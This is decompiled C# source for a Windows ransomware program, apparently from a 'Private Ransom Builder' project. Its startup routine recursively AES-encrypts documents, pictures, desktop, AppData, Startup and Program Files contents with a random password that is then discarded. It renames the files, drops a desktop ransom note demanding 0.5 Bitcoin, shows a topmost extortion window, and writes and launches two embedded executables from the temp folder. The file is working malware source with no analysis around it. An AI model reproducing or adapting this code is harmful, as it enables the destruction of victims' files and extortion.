using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using RansomCodeTest.My;
using RansomCodeTest.My.Resources;

namespace RansomCodeTest;

[StandardModule]
internal sealed class GUI
{
	[AccessedThroughProperty("Close")]
	private static Label _Close;

	[AccessedThroughProperty("ButtonCheck")]
	private static Button _ButtonCheck;

	[AccessedThroughProperty("ButtonDycrpt")]
	private static Button _ButtonDycrpt;

	public static string Host = "131dsadyasghgeydwerwr";

	public static string Port = "Exemple : Hacker@mail.ru";

	public static string Name = "Exemple : Cerber 123";

	public static string SpreadExe = "[SpreadExe]";

	public static string Spreadlnk = "[Spreadlnk]";

	public static string SpreadP2P = "[SpreadP2P]";

	public static string SpreadSkype = "[SpreadSkype]";

	public static string ShortcutsInfection = "[SI]";

	private static TextBox dynamicText = null;

	public static string exten = " .exq";

	private static string userDir = "C:\\Users\\";

	private static Label Close
	{
		get
		{
			return _Close;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Label1_Click;
			if (_Close != null)
			{
				((Control)_Close).remove_Click(eventHandler);
			}
			_Close = value;
			if (_Close != null)
			{
				((Control)_Close).add_Click(eventHandler);
			}
		}
	} = new Label();


	private static Button ButtonCheck
	{
		get
		{
			return _ButtonCheck;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = ButtonCheck_Click;
			if (_ButtonCheck != null)
			{
				((Control)_ButtonCheck).remove_Click(eventHandler);
			}
			_ButtonCheck = value;
			if (_ButtonCheck != null)
			{
				((Control)_ButtonCheck).add_Click(eventHandler);
			}
		}
	} = new Button();


	private static Button ButtonDycrpt
	{
		get
		{
			return _ButtonDycrpt;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ButtonDycrpt = value;
		}
	} = new Button();


	public static string CreatePassword(int length)
	{
		string userName = Environment.UserName;
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		bool flag = 0 < length;
		checked
		{
			length--;
			while (flag)
			{
				stringBuilder.Append("abcdefghijklmnhhhhhhhhffffffswew63738363bhyght78399293u90ig,,gh,h,fh,,,ff904595868trk595896jk......................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@0o!CONFICKERRRRRRRRRRNKSDJJFEIFJIJAKSMMNDNFJANSKkkkkkkkkkkkkkkkkkkkkkkkkkkkkssssssssssssssssssssssssssssssssssssssssssssssssssssssss,DMF,SMFM,,......................................................................................W!!@#$$%T^%^&&*((*&*^&%*()_)(opqrstuvwxyzABCDABCDEFGHIJKLMNOPQRSTUVWXYZh dshjfhdjsbjabnbx zhefguwegjfhjwehjwejmnfmewnm fenm nmwe fefeabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*EFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnhhhhhhhhffffffswew63738363bhyght78399293u90ig,,gh,h,fh,,,ff904595868trk595896jk......................................................@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@0o!CONFICKERRRRRRRRRRNKSDJJFEIFJIJAKSMMNDNFJANSKkkkkkkkkkkkkkkkkkkkkkkkkkkkkssssssssssssssssssssssssssssssssssssssssssssssssssssssss,DMF,SMFM,,......................................................................................W!!@#$$%T^%^&&*((*&*^&%*()_)(opqrstuvwxyzABCDABCDEFGHIJKLMNOPQRSTUVWXYZh dshjfhdjsbjabnbx zhefguwegjfhjwehjwejmnfmewnm fenm nmwe fefeabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*EFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
				flag = 0 < length;
				length--;
			}
			return stringBuilder.ToString();
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	private static void Label1_Click(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}

	private static void ButtonCheck_Click(object sender, EventArgs e)
	{
	}

	public static void encryptDirectory(string location, string password)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		string[] files = default(string[]);
		string[] directories = default(string[]);
		int num6 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		string extension = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0008;
					case 231:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0011;
							case 4:
								goto IL_001b;
							case 5:
								goto IL_0025;
							case 6:
								goto IL_0034;
							case 7:
								goto IL_0041;
							case 8:
								goto IL_004d;
							case 9:
							case 10:
								goto IL_005a;
							case 11:
								goto IL_006a;
							case 12:
								goto IL_007a;
							case 13:
								goto IL_0088;
							default:
								goto end_IL_0000;
							case 14:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_005a:
						num = 10;
						num5++;
						goto IL_0064;
						IL_0008:
						num = 2;
						text = ".txt.doc.docx.mp3.xls.xlsx.ppt.sql.wmv.mp4.mp3.iso.dll.jar.pptx.odt.jpg.tar.gz.bmp.pbm.rtf.png.csv.sql.mdb.sln.php\".avi.mov.flv.amv.mpv.mtv.asp.aspx.html.xml.psd.pdf.exe.rv.rvx.ved.wm.wmv.TXT.JPG.rar.xwmv.wma.midi.fla.pdf.wma.ico.gif.GIF.ogg.mpg.icns.RAR.png.zip.BAT.Exe.c.exe.PNG.iso.7z.7Z";
						goto IL_0011;
						IL_0011:
						num = 3;
						files = Directory.GetFiles(location);
						goto IL_001b;
						IL_001b:
						num = 4;
						directories = Directory.GetDirectories(location);
						goto IL_0025;
						IL_0025:
						num = 5;
						num6 = files.Length - 1;
						num5 = 0;
						goto IL_0064;
						IL_0064:
						if (num5 <= num6)
						{
							goto IL_0034;
						}
						goto IL_006a;
						IL_006a:
						num = 11;
						num7 = directories.Length - 1;
						num8 = 0;
						goto IL_0092;
						IL_0092:
						if (num8 > num7)
						{
							goto end_IL_0000_2;
						}
						goto IL_007a;
						IL_007a:
						num = 12;
						encryptDirectory(directories[num8], password);
						goto IL_0088;
						IL_0088:
						num = 13;
						num8++;
						goto IL_0092;
						IL_0034:
						num = 6;
						extension = Path.GetExtension(files[num5]);
						goto IL_0041;
						IL_0041:
						num = 7;
						if (text.Contains(extension))
						{
							goto IL_004d;
						}
						goto IL_005a;
						IL_004d:
						num = 8;
						EncryptFiles(files[num5], password);
						goto IL_005a;
						end_IL_0000:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 231;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void EncryptFiles(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + exten);
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		//Discarded unreachable code: IL_00e4
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + exten);
	}

	[STAThread]
	public static void Main()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017e: Expected O, but got Unknown
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Expected O, but got Unknown
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0232: Expected O, but got Unknown
		//IL_026b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0275: Expected O, but got Unknown
		//IL_02d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02da: Expected O, but got Unknown
		//IL_02da: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e0: Expected O, but got Unknown
		//IL_02ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f6: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c4: Expected O, but got Unknown
		//IL_0424: Unknown result type (might be due to invalid IL or missing references)
		//IL_042b: Expected O, but got Unknown
		//IL_047f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0489: Expected O, but got Unknown
		//IL_04df: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e9: Expected O, but got Unknown
		//IL_0566: Unknown result type (might be due to invalid IL or missing references)
		//IL_0570: Expected O, but got Unknown
		//IL_05e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ee: Expected O, but got Unknown
		starting();
		Form val = new Form();
		TextBox val2 = new TextBox();
		Panel val3 = new Panel();
		Label val4 = new Label();
		Label val5 = new Label();
		Label val6 = new Label();
		val6.set_Text("   : ");
		((Control)val6).set_ForeColor(Color.Green);
		((Control)val6).set_BackColor(Color.Black);
		Point location = new Point(200, 25);
		((Control)val6).set_Location(location);
		Size size = new Size(470, 25);
		((Control)val6).set_Size(size);
		((Control)val6).set_Font(new Font("Arial", 14f, (FontStyle)0));
		((Control)val).get_Controls().Add((Control)(object)val6);
		((Control)val).get_Controls().Add((Control)(object)val6);
		size = new Size(500, 450);
		val.set_Size(size);
		val.set_StartPosition((FormStartPosition)1);
		val.set_TopMost(true);
		val.set_Text("Private Ransom Builder");
		val4.set_Text(" Your Files Has Been encrypted By : " + Name.Replace(".", ""));
		val5.set_Text("  Contact us By Email : ");
		((Control)val5).set_ForeColor(Color.White);
		((Control)val5).set_BackColor(Color.Black);
		((Control)val4).set_ForeColor(Color.White);
		((Control)val4).set_BackColor(Color.Black);
		location = new Point(5, 5);
		((Control)val5).set_Location(location);
		size = new Size(4, 5);
		((Control)val5).set_Size(size);
		((Control)val5).set_Font(new Font("Arial", 10f, (FontStyle)0));
		((Control)val).get_Controls().Add((Control)(object)val5);
		((Control)val).get_Controls().Add((Control)(object)val5);
		val.set_BackColor(Color.Black);
		((Control)val).set_ForeColor(Color.Lime);
		size = new Size(500, 300);
		((Control)val3).set_Size(size);
		location = new Point(0, 50);
		((Control)val3).set_Location(location);
		((Control)val3).set_Visible(true);
		((Control)val3).set_BackColor(Color.Black);
		location = new Point(5, 5);
		((Control)val4).set_Location(location);
		size = new Size(470, 25);
		((Control)val4).set_Size(size);
		((Control)val4).set_Font(new Font("Arial", 12f, (FontStyle)0));
		RichTextBox val7 = new RichTextBox();
		((Control)val7).set_Dock((DockStyle)1);
		val7.set_ForeColor(Color.Red);
		((TextBoxBase)val7).set_BackColor(Color.Black);
		val7.set_Text(Resources.String1);
		val7.set_Font(new Font("Arial", 14f, (FontStyle)0));
		size = new Size(((Control)val3).get_Width(), checked(((Control)val3).get_Height() - 30));
		((Control)val7).set_Size(size);
		((TextBoxBase)val7).set_ReadOnly(true);
		((Control)val).get_Controls().Add((Control)(object)val4);
		((Control)val).get_Controls().Add((Control)(object)val4);
		((Control)val3).get_Controls().Add((Control)(object)val7);
		((Control)val2).set_Font(new Font("Arial", 14f, (FontStyle)0));
		Label val8 = new Label();
		((Control)val8).set_Font(new Font("Arial", 8f, (FontStyle)0));
		location = new Point(0, 350);
		((Control)val8).set_Location(location);
		val8.set_Text("send 0.5 Bitcoin to:");
		((Control)val8).set_ForeColor(Color.Lime);
		((Control)val8).set_BackColor(Color.Black);
		location = new Point(100, 345);
		((Control)val2).set_Location(location);
		((Control)val).get_Controls().Add((Control)(object)val8);
		location = new Point(100, 345);
		((Control)val2).set_Location(location);
		val2.set_Text(Host);
		((TextBoxBase)val2).set_ReadOnly(true);
		size = new Size(380, 30);
		((Control)val2).set_Size(size);
		((Control)val).get_Controls().Add((Control)(object)val2);
		val.set_FormBorderStyle((FormBorderStyle)0);
		location = new Point(100, 345);
		((Control)val2).set_Location(location);
		TextBox val9 = null;
		val9 = new TextBox();
		((Control)val9).set_Name("00");
		TextBox obj = val9;
		location = new Point(200, 420);
		((Control)obj).set_Location(location);
		TextBox obj2 = val9;
		size = new Size(250, 200);
		((Control)obj2).set_Size(size);
		((Control)val9).set_TabIndex(0);
		((Control)val).get_Controls().Add((Control)(object)val9);
		TextBox val10 = (TextBox)((Control)val).get_Controls().get_Item("00");
		((Control)val).get_Controls().Add((Control)(object)val9);
		val9.set_Text(Port);
		Close.set_Text("X");
		((Control)Close).set_BackColor(Color.Black);
		((Control)Close).set_ForeColor(Color.Red);
		((Control)Close).set_Font(new Font("Arial", 18f, (FontStyle)0));
		Label close = Close;
		location = new Point(470, 5);
		((Control)close).set_Location(location);
		((ButtonBase)ButtonCheck).set_Text("contact us by email:");
		((Control)ButtonCheck).set_ForeColor(Color.White);
		((ButtonBase)ButtonCheck).set_BackColor(Color.Black);
		((Control)ButtonCheck).set_Font(new Font("Arial", 14f, (FontStyle)0));
		Button buttonCheck = ButtonCheck;
		size = new Size(250, 40);
		((Control)buttonCheck).set_Size(size);
		Button buttonCheck2 = ButtonCheck;
		location = new Point(50, 380);
		((Control)buttonCheck2).set_Location(location);
		Clipboard.SetText(val2.get_Text());
		((ButtonBase)ButtonDycrpt).set_Text("copy Bitcoin");
		((Control)ButtonDycrpt).set_ForeColor(Color.Lime);
		((ButtonBase)ButtonDycrpt).set_BackColor(Color.Black);
		((Control)ButtonDycrpt).set_Font(new Font("Arial", 14f, (FontStyle)0));
		Button buttonDycrpt = ButtonDycrpt;
		size = new Size(150, 30);
		((Control)buttonDycrpt).set_Size(size);
		Button buttonDycrpt2 = ButtonDycrpt;
		location = new Point(340, 380);
		((Control)buttonDycrpt2).set_Location(location);
		((ButtonBase)ButtonDycrpt).set_Text("copy Bitcoin");
		((Control)ButtonDycrpt).set_ForeColor(Color.Lime);
		((ButtonBase)ButtonDycrpt).set_BackColor(Color.Black);
		((Control)ButtonDycrpt).set_Font(new Font("Arial", 14f, (FontStyle)0));
		Button buttonDycrpt3 = ButtonDycrpt;
		size = new Size(150, 30);
		((Control)buttonDycrpt3).set_Size(size);
		Button buttonDycrpt4 = ButtonDycrpt;
		location = new Point(340, 380);
		((Control)buttonDycrpt4).set_Location(location);
		((Control)val).get_Controls().Add((Control)(object)ButtonDycrpt);
		((Control)val).get_Controls().Add((Control)(object)ButtonCheck);
		((Control)val).get_Controls().Add((Control)(object)Close);
		((Control)val).get_Controls().Add((Control)(object)val3);
		((Control)val).Show();
		Application.Run();
	}

	private static void spesh()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string temp = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 127:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_0028;
						case 5:
							goto IL_0037;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0037:
					num = 5;
					File.WriteAllBytes(text, Resources.Read_My);
					break;
					IL_0007:
					num = 2;
					num5 = 1000;
					goto IL_0010;
					IL_0010:
					num = 3;
					temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_0028;
					IL_0028:
					num = 4;
					text = temp + "spesh.exe";
					goto IL_0037;
					end_IL_0000_2:
					break;
				}
				num = 6;
				Process.Start(text);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 127;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static void pic()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string temp = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 127:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_0028;
						case 5:
							goto IL_0037;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0037:
					num = 5;
					File.WriteAllBytes(text, Resources.picc);
					break;
					IL_0007:
					num = 2;
					num5 = 1000;
					goto IL_0010;
					IL_0010:
					num = 3;
					temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_0028;
					IL_0028:
					num = 4;
					text = temp + "picc.exe";
					goto IL_0037;
					end_IL_0000_2:
					break;
				}
				num = 6;
				Process.Start(text);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 127;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void msgdesktop()
	{
		string userName = Environment.UserName;
		string text = "\\Desktop\\@-Decrypt-@.txt";
		string path = userDir + userName + text;
		string[] contents = new string[19]
		{
			"", "            ", "###################################", "             ", "  Attention! Attention! Attention! Your Files has been encrypted By     R_A_N_S_O_M_W_A_R_E ", "              ", " ########################################     ", "         ", "            ", "                             ",
			"Send 0.5 Bitcoin  @  ", "             ", "#####################################", "            ", "  If Send 0.5 Bitcoin We will send you the decryption key  Decryptor    ", "            ", "##################################", "            ", "    "
		};
		File.WriteAllLines(path, contents);
	}

	public static void starting()
	{
		string password = CreatePassword(15);
		string text = "\\Users";
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\test", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Programs) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\", password);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Programs) + "\\", password);
		pic();
		msgdesktop();
		spesh();
	}
}
